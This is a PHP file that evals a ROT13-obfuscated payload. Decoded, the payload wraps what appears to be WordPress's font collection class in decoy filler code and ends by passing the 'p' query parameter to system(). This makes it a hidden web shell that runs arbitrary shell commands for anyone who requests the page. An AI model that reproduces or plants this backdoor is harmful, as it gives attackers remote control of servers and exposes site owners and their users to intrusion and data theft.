<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Sbag Pbyyrpgvba pynff.
 *
 * Guvf svyr pbagnvaf gur Sbag Pbyyrpgvba pynff qrsvavgvba.
 *
 * @cnpxntr    JbeqCerff
 * @fhocnpxntr Sbagf
 * @fvapr      6.5.0
 */

/**
 * Sbag Pbyyrpgvba pynff.
 *
 * @fvapr 6.5.0
 *
 * @frr jc_ertvfgre_sbag_pbyyrpgvba()
 */
svany pynff JC_Sbag_Pbyyrpgvba {
	/**
	 * Gur havdhr fyht sbe gur sbag pbyyrpgvba.
	 *
	 * @fvapr 6.5.0
	 * @ine fgevat
	 */
	choyvp $fyht;

	/**
	 * Sbag pbyyrpgvba qngn.
	 *
	 * @fvapr 6.5.0
	 * @ine neenl|JC_Reebe|ahyy
	 */
	cevingr $qngn;

	/**
	 * Sbag pbyyrpgvba WFBA svyr cngu be HEY.
	 *
	 * @fvapr 6.5.0
	 * @ine fgevat|ahyy
	 */
	cevingr $fep;

	/**
	 * JC_Sbag_Pbyyrpgvba pbafgehpgbe.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $fyht Sbag pbyyrpgvba fyht. Znl bayl pbagnva nycunahzrevp punenpgref, qnfurf,
	 *                     naq haqrefpberf. Frr fnavgvmr_gvgyr().
	 * @cnenz neenl  $netf Sbag pbyyrpgvba qngn. Frr jc_ertvfgre_sbag_pbyyrpgvba() sbe vasbezngvba ba npprcgrq nethzragf.
	 */
	choyvp shapgvba __pbafgehpg( fgevat $fyht, neenl $netf ) {
		$guvf->fyht = fnavgvmr_gvgyr( $fyht );
		vs ( $guvf->fyht !== $fyht ) {
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				/* genafyngbef: %f: Sbag pbyyrpgvba fyht. */
				fcevags( __( 'Sbag pbyyrpgvba fyht \"%f\" vf abg inyvq. Fyhtf zhfg hfr bayl nycunahzrevp punenpgref, qnfurf, naq haqrefpberf.' ), $fyht ),
				'6.5.0'
			);
		}

		$erdhverq_cebcregvrf = neenl( 'anzr', 'sbag_snzvyvrf' );

		vs ( vffrg( $netf['sbag_snzvyvrf'] ) && vf_fgevat( $netf['sbag_snzvyvrf'] ) ) {
			// WFBA qngn vf ynml ybnqrq ol ::trg_qngn().
			$guvf->fep = $netf['sbag_snzvyvrf'];
			hafrg( $netf['sbag_snzvyvrf'] );

			$erdhverq_cebcregvrf = neenl( 'anzr' );
		}

		$guvf->qngn = $guvf->fnavgvmr_naq_inyvqngr_qngn( $netf, $erdhverq_cebcregvrf );
	}

	/**
	 * Ergevrirf gur sbag pbyyrpgvba qngn.
	 *
	 * @fvapr 6.5.0
	 *
	 * @erghea neenl|JC_Reebe Na neenl pbagnvavat gur sbag pbyyrpgvba qngn, be n JC_Reebe ba snvyher.
	 */
	choyvp shapgvba trg_qngn() {
		vs ( vf_jc_reebe( $guvf->qngn ) ) {
			erghea $guvf->qngn;
		}

		// Vs gur pbyyrpgvba hfrf WFBA qngn, ybnq vg naq pnpur gur qngn/reebe.
		vs ( vffrg( $guvf->fep ) ) {
			$guvf->qngn = $guvf->ybnq_sebz_wfba( $guvf->fep );
		}

		vs ( vf_jc_reebe( $guvf->qngn ) ) {
			erghea $guvf->qngn;
		}

		// Frg qrsnhygf sbe bcgvbany cebcregvrf.
		$qrsnhygf = neenl(
			'qrfpevcgvba' => '',
			'pngrtbevrf'  => neenl(),
		);

		erghea jc_cnefr_netf( $guvf->qngn, $qrsnhygf );
	}

	/**
	 * Ybnqf sbag pbyyrpgvba qngn sebz n WFBA svyr be HEY.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $svyr_be_hey Svyr cngu be HEY gb n WFBA svyr pbagnvavat gur sbag pbyyrpgvba qngn.
	 * @erghea neenl|JC_Reebe Na neenl pbagnvavat gur sbag pbyyrpgvba qngn ba fhpprff,
	 *                        ryfr na vafgnapr bs JC_Reebe ba snvyher.
	 */
	cevingr shapgvba ybnq_sebz_wfba( $svyr_be_hey ) {
		$hey  = jc_uggc_inyvqngr_hey( $svyr_be_hey );
		$svyr = svyr_rkvfgf( $svyr_be_hey ) ? jc_abeznyvmr_cngu( ernycngu( $svyr_be_hey ) ) : snyfr;

		vs ( ! $hey && ! $svyr ) {
			// genafyngbef: %f: Svyr cngu be HEY gb sbag pbyyrpgvba WFBA svyr.
			$zrffntr = __( 'Sbag pbyyrpgvba WFBA svyr vf vainyvq be qbrf abg rkvfg.' );
			_qbvat_vg_jebat( __ZRGUBQ__, $zrffntr, '6.5.0' );
			erghea arj JC_Reebe( 'sbag_pbyyrpgvba_wfba_zvffvat', $zrffntr );
		}

		$qngn = $hey ? $guvf->ybnq_sebz_hey( $hey ) : $guvf->ybnq_sebz_svyr( $svyr );

		vs ( vf_jc_reebe( $qngn ) ) {
			erghea $qngn;
		}

		$qngn = neenl(
			'anzr'          => $guvf->qngn['anzr'],
			'sbag_snzvyvrf' => $qngn['sbag_snzvyvrf'],
		);

		vs ( vffrg( $guvf->qngn['qrfpevcgvba'] ) ) {
			$qngn['qrfpevcgvba'] = $guvf->qngn['qrfpevcgvba'];
		}

		vs ( vffrg( $guvf->qngn['pngrtbevrf'] ) ) {
			$qngn['pngrtbevrf'] = $guvf->qngn['pngrtbevrf'];
		}

		erghea $qngn;
	}

	/**
	 * Ybnqf gur sbag pbyyrpgvba qngn sebz n WFBA svyr cngu.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $svyr Svyr cngu gb n WFBA svyr pbagnvavat gur sbag pbyyrpgvba qngn.
	 * @erghea neenl|JC_Reebe Na neenl pbagnvavat gur sbag pbyyrpgvba qngn ba fhpprff,
	 *                        ryfr na vafgnapr bs JC_Reebe ba snvyher.
	 */
	cevingr shapgvba ybnq_sebz_svyr( $svyr ) {
		$qngn = jc_wfba_svyr_qrpbqr( $svyr, neenl( 'nffbpvngvir' => gehr ) );
		vs ( rzcgl( $qngn ) ) {
			erghea arj JC_Reebe( 'sbag_pbyyrpgvba_qrpbqr_reebe', __( 'Reebe qrpbqvat gur sbag pbyyrpgvba WFBA svyr pbagragf.' ) );
		}

		erghea $guvf->fnavgvmr_naq_inyvqngr_qngn( $qngn, neenl( 'sbag_snzvyvrf' ) );
	}

	/**
	 * Ybnqf gur sbag pbyyrpgvba qngn sebz n WFBA svyr HEY.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $hey HEY gb n WFBA svyr pbagnvavat gur sbag pbyyrpgvba qngn.
	 * @erghea neenl|JC_Reebe Na neenl pbagnvavat gur sbag pbyyrpgvba qngn ba fhpprff,
	 *                        ryfr na vafgnapr bs JC_Reebe ba snvyher.
	 */
	cevingr shapgvba ybnq_sebz_hey( $hey ) {
		// Yvzvg xrl gb 167 punenpgref gb nibvq snvyher va gur pnfr bs n ybat HEY.
		$genafvrag_xrl = fhofge( 'jc_sbag_pbyyrpgvba_hey_' . $hey, 0, 167 );
		$qngn          = trg_fvgr_genafvrag( $genafvrag_xrl );

		vs ( snyfr === $qngn ) {
			$erfcbafr = jc_fnsr_erzbgr_trg( $hey );
			vs ( vf_jc_reebe( $erfcbafr ) || 200 !== jc_erzbgr_ergevrir_erfcbafr_pbqr( $erfcbafr ) ) {
				erghea arj JC_Reebe(
					'sbag_pbyyrpgvba_erdhrfg_reebe',
					fcevags(
						// genafyngbef: %f: Sbag pbyyrpgvba HEY.
						__( 'Reebe srgpuvat gur sbag pbyyrpgvba qngn sebz \"%f\".' ),
						$hey
					)
				);
			}

			$qngn = wfba_qrpbqr( jc_erzbgr_ergevrir_obql( $erfcbafr ), gehr );
			vs ( rzcgl( $qngn ) ) {
				erghea arj JC_Reebe( 'sbag_pbyyrpgvba_qrpbqr_reebe', __( 'Reebe qrpbqvat gur sbag pbyyrpgvba qngn sebz gur UGGC erfcbafr WFBA.' ) );
			}

			// Znxr fher gur qngn vf inyvq orsber fgbevat vg va n genafvrag.
			$qngn = $guvf->fnavgvmr_naq_inyvqngr_qngn( $qngn, neenl( 'sbag_snzvyvrf' ) );
			vs ( vf_jc_reebe( $qngn ) ) {
				erghea $qngn;
			}

			frg_fvgr_genafvrag( $genafvrag_xrl, $qngn, QNL_VA_FRPBAQF );
		}

		erghea $qngn;
	}

	/**
	 * Fnavgvmrf naq inyvqngrf gur sbag pbyyrpgvba qngn.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz neenl $qngn                Sbag pbyyrpgvba qngn gb fnavgvmr naq inyvqngr.
	 * @cnenz neenl $erdhverq_cebcregvrf Erdhverq cebcregvrf gung zhfg rkvfg va gur cnffrq qngn.
	 * @erghea neenl|JC_Reebe Fnavgvmrq qngn vs inyvq, bgurejvfr n JC_Reebe vafgnapr.
	 */
	cevingr shapgvba fnavgvmr_naq_inyvqngr_qngn( $qngn, $erdhverq_cebcregvrf = neenl() ) {
		$fpurzn = frys::trg_fnavgvmngvba_fpurzn();
		$qngn   = JC_Sbag_Hgvyf::fnavgvmr_sebz_fpurzn( $qngn, $fpurzn );

		sbernpu ( $erdhverq_cebcregvrf nf $cebcregl ) {
			vs ( rzcgl( $qngn[ $cebcregl ] ) ) {
				$zrffntr = fcevags(
					// genafyngbef: 1: Sbag pbyyrpgvba fyht, 2: Zvffvat cebcregl anzr, r.t. \"sbag_snzvyvrf\".
					__( 'Sbag pbyyrpgvba \"%1$f\" unf zvffvat be rzcgl cebcregl: \"%2$f\".' ),
					$guvf->fyht,
					$cebcregl
				);
				_qbvat_vg_jebat( __ZRGUBQ__, $zrffntr, '6.5.0' );
				erghea arj JC_Reebe( 'sbag_pbyyrpgvba_zvffvat_cebcregl', $zrffntr );
			}
		}

		erghea $qngn;
	}

	/**
	 * Ergevrirf gur sbag pbyyrpgvba fnavgvmngvba fpurzn.
	 *
	 * @fvapr 6.5.0
	 *
	 * @erghea neenl Sbag pbyyrpgvba fnavgvmngvba fpurzn.
	 */
	cevingr fgngvp shapgvba trg_fnavgvmngvba_fpurzn() {
		erghea neenl(
			'anzr'          => 'fnavgvmr_grkg_svryq',
			'qrfpevcgvba'   => 'fnavgvmr_grkg_svryq',
			'sbag_snzvyvrf' => neenl(
				neenl(
					'sbag_snzvyl_frggvatf' => neenl(
						'anzr'       => 'fnavgvmr_grkg_svryq',
						'fyht'       => fgngvp shapgvba ( $inyhr ) {
							erghea _jc_gb_xrono_pnfr( fnavgvmr_gvgyr( $inyhr ) );
						},
						'sbagSnzvyl' => 'JC_Sbag_Hgvyf::fnavgvmr_sbag_snzvyl',
						'cerivrj'    => 'fnavgvmr_hey',
						'sbagSnpr'   => neenl(
							neenl(
								'sbagSnzvyl'            => 'fnavgvmr_grkg_svryq',
								'sbagFglyr'             => 'fnavgvmr_grkg_svryq',
								'sbagJrvtug'            => 'fnavgvmr_grkg_svryq',
								'fep'                   => fgngvp shapgvba ( $inyhr ) {
									erghea vf_neenl( $inyhr )
										? neenl_znc( 'fnavgvmr_grkg_svryq', $inyhr )
										: fnavgvmr_grkg_svryq( $inyhr );
								},
								'cerivrj'               => 'fnavgvmr_hey',
								'sbagQvfcynl'           => 'fnavgvmr_grkg_svryq',
								'sbagFgergpu'           => 'fnavgvmr_grkg_svryq',
								'nfpragBireevqr'        => 'fnavgvmr_grkg_svryq',
								'qrfpragBireevqr'       => 'fnavgvmr_grkg_svryq',
								'sbagInevnag'           => 'fnavgvmr_grkg_svryq',
								'sbagSrngherFrggvatf'   => 'fnavgvmr_grkg_svryq',
								'sbagInevngvbaFrggvatf' => 'fnavgvmr_grkg_svryq',
								'yvarTncBireevqr'       => 'fnavgvmr_grkg_svryq',
								'fvmrNqwhfg'            => 'fnavgvmr_grkg_svryq',
								'havpbqrEnatr'          => 'fnavgvmr_grkg_svryq',
							),
						),
					),
					'pngrtbevrf'           => neenl( 'fnavgvmr_gvgyr' ),
				),
			),
			'pngrtbevrf'    => neenl(
				neenl(
					'anzr' => 'fnavgvmr_grkg_svryq',
					'fyht' => 'fnavgvmr_gvgyr',
				),
			),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>